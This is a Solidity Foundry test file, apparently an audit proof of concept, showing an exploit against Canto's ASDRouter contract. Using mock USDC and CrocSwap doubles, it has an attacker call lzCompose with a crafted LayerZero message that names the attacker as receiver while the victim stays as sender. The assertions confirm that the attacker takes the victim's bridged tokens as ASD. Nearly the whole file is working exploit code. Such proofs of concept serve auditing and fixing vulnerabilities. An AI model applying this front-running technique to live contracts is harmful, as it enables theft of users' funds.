// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ASDRouter} from "../src/canto/contracts/asd/asdRouter.sol";
import {ASDUSDC} from "../src/canto/contracts/asd/asdUSDC.sol";
import {ICrocSwapDex, ICrocImpact} from "../src/canto/contracts/ambient/CrocInterfaces.sol";
import {ASDOFT} from "../src/canto/contracts/asd/asdOFT.sol";

/// @notice Minimal external doubles. The exploit itself executes the
/// unmodified Canto ASDRouter and ASDUSDC contracts from the audited commit.
contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockCrocSwap is ICrocSwapDex {
    function readSlot(uint256) external pure returns (uint256 data) {
        // A non-zero pool parameter makes ASDRouter take the swap branch.
        return 1;
    }

    function swap(
        address,
        address,
        uint256,
        bool,
        bool,
        uint128 qty,
        uint16,
        uint128,
        uint128,
        uint8
    ) external payable returns (int128 baseQuote, int128 quoteFlow) {
        // Croc reports flow leaving the pool as negative. Return a 1:1 fill.
        baseQuote = -int128(qty);
        quoteFlow = -int128(qty);
    }
}

contract MockCrocImpact is ICrocImpact {
    function calcImpact(
        address,
        address,
        uint256,
        bool,
        bool,
        uint128 qty,
        uint16,
        uint128
    ) external pure returns (int128 baseFlow, int128 quoteFlow, uint128 finalPrice) {
        baseFlow = -int128(qty);
        quoteFlow = -int128(qty);
        finalPrice = 1e18;
    }
}

contract PoC_32130 is Test {
    MockUSDC internal usdc;
    ASDUSDC internal asdUSDC;
    ASDOFT internal asd;
    ASDRouter internal router;
    MockCrocSwap internal crocSwap;
    MockCrocImpact internal crocImpact;

    address internal victim = address(0xBEEF);
    address internal attacker = address(0xA11CE);
    uint256 internal constant AMOUNT = 100e18;

    function setUp() public {
        usdc = new MockUSDC();
        asdUSDC = new ASDUSDC();
        asd = new ASDOFT(asdUSDC);
        crocSwap = new MockCrocSwap();
        crocImpact = new MockCrocImpact();

        // The real deployment whitelists the LayerZero OFT. This test uses
        // MockUSDC as that OFT while preserving the production check.
        asdUSDC.updateWhitelist(address(usdc), true);
        router = new ASDRouter(
            address(asdUSDC),
            1,
            address(crocSwap),
            address(crocImpact),
            address(asdUSDC)
        );

        // Model tokens already delivered by LayerZero to the router. The
        // encoded composeFrom remains the victim, but is never authenticated.
        usdc.mint(address(router), AMOUNT);
    }

    function test_attackerFrontRunsComposedMessageAndStealsOft() public {
        bytes memory composeMsg = abi.encode(
            uint32(1),
            attacker,
            address(asd),
            address(asd),
            AMOUNT,
            victim,
            uint256(0)
        );
        bytes memory message = abi.encodePacked(
            uint64(1),
            uint32(999),
            AMOUNT,
            bytes32(uint256(uint160(victim))),
            composeMsg
        );

        // Anyone can invoke the composer. ASDRouter only checks _from's
        // whitelist and trusts the receiver embedded in the unbound payload.
        vm.prank(attacker);
        router.lzCompose(address(usdc), bytes32(uint256(1)), message, attacker, "");

        assertEq(usdc.balanceOf(address(router)), 0, "OFT was not consumed");
        assertEq(asd.balanceOf(attacker), AMOUNT, "attacker did not receive ASD");
        assertEq(asd.balanceOf(victim), 0, "composeFrom unexpectedly received funds");
    }
}
